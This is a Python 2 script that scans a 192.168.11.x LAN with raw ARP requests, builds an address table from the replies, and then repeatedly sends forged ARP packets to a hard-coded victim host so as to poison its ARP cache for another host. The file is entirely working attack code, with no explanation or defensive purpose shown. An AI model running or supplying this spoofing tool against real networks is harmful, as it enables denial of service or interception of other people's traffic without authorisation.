# -*- coding: utf-8 -*-


import protocol
import socket
import binascii
import time
import threading

def InitArpRequest(dest_ip):
  eth = protocol.EtherHeader()
  eth.ether_dhost = 'ffffffffffff'
  eth.ether_shost = '000c2949945d'
  eth.ether_type  = 0x0806

  arp = protocol.ArpProtocol()
  arp.arp_hardware  = 0x0001
  arp.arp_protocol  = 0x0800
  arp.arp_haddr_len = 0x06
  arp.arp_paddr_len = 0x04
  arp.arp_oper      = 0x0001

  arp.arp_eth_src   = '000c2949945d'
  arp.arp_ip_src    = '192.168.11.97'
  arp.arp_eth_dest  = binascii.b2a_hex(chr(0) * 6)
  arp.arp_ip_dest   = dest_ip

  return (eth, arp)

def InitArpResponse(ipSrc, ethSrc, ipDest, ethDest):
  eth = protocol.EtherHeader()
  eth.ether_dhost = ethDest
  eth.ether_shost = ethSrc
  eth.ether_type  = 0x0806

  arp = protocol.ArpProtocol()
  arp.arp_hardware  = 0x0001
  arp.arp_protocol  = 0x0800
  arp.arp_haddr_len = 0x06
  arp.arp_paddr_len = 0x04
  arp.arp_oper      = 0x0001

  arp.arp_eth_src   = ethSrc
  arp.arp_ip_src    = ipSrc
  arp.arp_eth_dest  = ethDest
  arp.arp_ip_dest   = ipDest

  return (eth, arp)



ARP_TABLE = {}

def ArpResp(arp):
  global ARP_TABLE
  if ARP_TABLE.get(arp.arp_ip_src, None) != arp.arp_eth_dest:
    ARP_TABLE[arp.arp_ip_src] = arp.arp_eth_src
    print 'UpdateArp %15s %s' % (arp.arp_ip_src, arp.arp_eth_src)
  return


def ListenArp():
  sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
  sock.bind(("eth0", 0x0806))

  global ARP_TABLE
  while True:
    buff = sock.recv(2048)
    eth, arp = protocol.EtherHeader(), protocol.ArpProtocol()

    eth.unpack(buff[: 14])
    arp.unpack(buff[14: ])
    if arp.arp_oper == 2:
      ArpResp(arp)
  return

def BuildArpTable():
  sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
  sock.bind(("eth0", 0x0806))

  sleep = 1
  while True:
    for i in range(255):
      eth, arp = InitArpRequest("192.168.11.%s" % i)
      data = eth.pack() + arp.pack() + chr(0) * 18
      sock.send(data)
      time.sleep(sleep / 10.0)
    if sleep == 1:
      sleep += 10
  return

def Runingbg(func, *args, **kwargs):
  thread = threading.Thread(target = func, *args, **kwargs)
  thread.setDaemon(True)
  thread.start()


def MakeBlind(src_ip, dest_ip):
  sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
  sock.bind(("eth0", 0x0806))
  while True:
    time.sleep(2)
    if src_ip not in ARP_TABLE or dest_ip not in ARP_TABLE:
      continue
    src_eth = ARP_TABLE[src_ip]
    dest_eth = ARP_TABLE[dest_ip]

    eth, arp = InitArpResponse(dest_ip, dest_eth, src_ip, src_eth)

    print 'make bind', src_ip, dest_ip
    sock.send(eth.pack() + arp.pack() + chr(0) * 18)


def main():
  MakeBlind("192.168.11.23", "192.168.11.140")
  while True:
    time.sleep(1)

Runingbg(BuildArpTable)
Runingbg(ListenArp)

main()
